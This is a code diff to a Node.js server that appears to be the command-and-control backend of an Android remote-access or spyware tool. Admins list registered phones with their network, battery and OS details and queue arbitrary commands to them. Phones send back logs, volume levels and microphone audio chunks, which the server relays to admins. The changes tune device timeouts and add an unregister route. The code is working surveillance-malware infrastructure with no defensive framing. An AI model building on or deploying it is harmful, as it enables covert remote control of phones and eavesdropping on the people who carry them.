@@ -3,10 +3,7 @@ const url = require('url');
 
 const PORT = process.env.PORT || 10000;
 
-// deviceId -> { name, network, battery, android, lastSeen, queue: [] }
 const clients = new Map();
-
-// adminId -> { lastSeen, queue: [] }
 const admins = new Map();
 
 function send(res, code, obj) {
@@ -65,21 +62,40 @@ const server = http.createServer(async (req, res) => {
         return send(res, 200, { ok: true });
     }
 
+    // === ОТКЛЮЧЕНИЕ ===
+    if (path === '/unregister') {
+        const body = await readBody(req);
+        const role = body.role || q.role || 'client';
+        const id = body.deviceId || q.id || 'unknown';
+
+        if (role === 'admin') {
+            admins.delete(id);
+            console.log('[-] admin unregister: ' + id);
+        } else {
+            clients.delete(id);
+            console.log('[-] client unregister: ' + id);
+        }
+        return send(res, 200, { ok: true });
+    }
+
     // === ОПРОС ===
     if (path === '/poll') {
         const role = q.role || 'client';
         const id = q.id || 'unknown';
 
         if (role === 'admin') {
+            const now = Date.now();
             const devices = [];
             for (const [did, c] of clients) {
+                // Только те, кто был активен последние 15 секунд
+                if (now - c.lastSeen > 15000) continue;
                 devices.push({
                     id: did,
                     name: c.name,
                     network: c.network,
                     battery: c.battery,
                     android: c.android,
-                    online: Date.now() - c.lastSeen < 20000,
+                    online: true,
                     lastSeen: c.lastSeen
                 });
             }
@@ -97,7 +113,6 @@ const server = http.createServer(async (req, res) => {
             });
         }
 
-        // Клиенту — очередь команд
         const c = clients.get(id);
         if (!c) {
             return send(res, 200, { ok: false, reason: 'not_registered', queue: [] });
@@ -108,7 +123,7 @@ const server = http.createServer(async (req, res) => {
         return send(res, 200, { ok: true, queue: queue });
     }
 
-    // === ОТПРАВКА КОМАНДЫ (от админа) ===
+    // === ОТПРАВКА КОМАНДЫ ===
     if (path === '/send') {
         const body = await readBody(req);
         const target = body.target;
@@ -118,7 +133,6 @@ const server = http.createServer(async (req, res) => {
         const c = clients.get(target);
         if (!c) return send(res, 404, { ok: false, error: 'offline' });
 
-        // ВАЖНО: type: 'command' — чтобы клиент понял
         c.queue.push({ type: 'command', cmd, payload, ts: Date.now() });
         console.log('[cmd] ' + target + ' <- ' + cmd);
         return send(res, 200, { ok: true });
@@ -140,30 +154,15 @@ const server = http.createServer(async (req, res) => {
             c.android = body.android || c.android;
         } else if (t === 'log') {
             for (const [, a] of admins) {
-                a.queue.push({
-                    type: 'log',
-                    deviceId: id,
-                    message: body.message || '',
-                    ts: Date.now()
-                });
+                a.queue.push({ type: 'log', deviceId: id, message: body.message || '', ts: Date.now() });
             }
         } else if (t === 'volume') {
             for (const [, a] of admins) {
-                a.queue.push({
-                    type: 'volume',
-                    deviceId: id,
-                    value: body.value || 0,
-                    ts: Date.now()
-                });
+                a.queue.push({ type: 'volume', deviceId: id, value: body.value || 0, ts: Date.now() });
             }
         } else if (t === 'mic_chunk') {
             for (const [, a] of admins) {
-                a.queue.push({
-                    type: 'mic_chunk',
-                    deviceId: id,
-                    data: body.data || '',
-                    ts: Date.now()
-                });
+                a.queue.push({ type: 'mic_chunk', deviceId: id, data: body.data || '', ts: Date.now() });
             }
         }
 
@@ -178,17 +177,16 @@ const server = http.createServer(async (req, res) => {
 setInterval(() => {
     const now = Date.now();
     for (const [id, c] of clients) {
-        if (now - c.lastSeen > 120000) {
+        if (now - c.lastSeen > 15000) {
             clients.delete(id);
-            console.log('[-] client removed: ' + id);
+            console.log('[-] client removed (timeout): ' + id);
         }
     }
     for (const [id, a] of admins) {
         if (now - a.lastSeen > 120000) {
             admins.delete(id);
-            console.log('[-] admin removed: ' + id);
         }
     }
-}, 30000);
+}, 5000);
 
 server.listen(PORT, () => console.log('Server on port ' + PORT));
